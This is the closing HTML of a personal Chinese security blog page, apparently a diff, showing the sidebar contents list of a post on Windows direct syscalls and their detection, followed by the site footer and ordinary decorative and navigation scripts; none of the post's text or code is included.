+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Syscall"><span class="nav-number">1.</span> <span class="nav-text">Syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90WindowsAPI%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">1.1.</span> <span class="nav-text">简单分析WindowsAPI调用过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7"><span class="nav-number">1.2.</span> <span class="nav-text">系统调用号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-number">1.3.</span> <span class="nav-text">代码实现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7"><span class="nav-number">1.4.</span> <span class="nav-text">动态获取系统调用号</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%8A%A8%E6%80%81%E8%AF%BB%E5%8F%96ntdll-dll%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0-%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%8F%B7"><span class="nav-number">1.4.1.</span> <span class="nav-text">1.动态读取ntdll.dll中的函数 获取函数调用号</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E9%80%9A%E8%BF%87dll%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%9A%84%E6%96%B9%E5%BC%8F%E7%9B%B4%E6%8E%A5Syscall"><span class="nav-number">1.4.2.</span> <span class="nav-text">2.通过dll导出表的方式直接Syscall</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Syscall%E9%A1%B9%E7%9B%AE"><span class="nav-number">1.5.</span> <span class="nav-text">Syscall项目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Syscall%E6%A3%80%E6%B5%8B"><span class="nav-number">1.6.</span> <span class="nav-text">Syscall检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Referernces"><span class="nav-number">1.7.</span> <span class="nav-text">Referernces</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mamor"
+      src="/images/kabi.jpg">
+  <p class="site-author-name" itemprop="name">Mamor</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">163</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Mamor5409" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Mamor5409" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mamor</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">679k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">10:17</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+<!--
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共171.9k字</span>
+</div>
+-->
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/ClickShowText.js"></script>
+
+<script type="text/javascript">
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
+
+
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<a href="https://mamor5409.github.io/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+
+<!--崩溃欺骗-->
+<script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+</html>
+
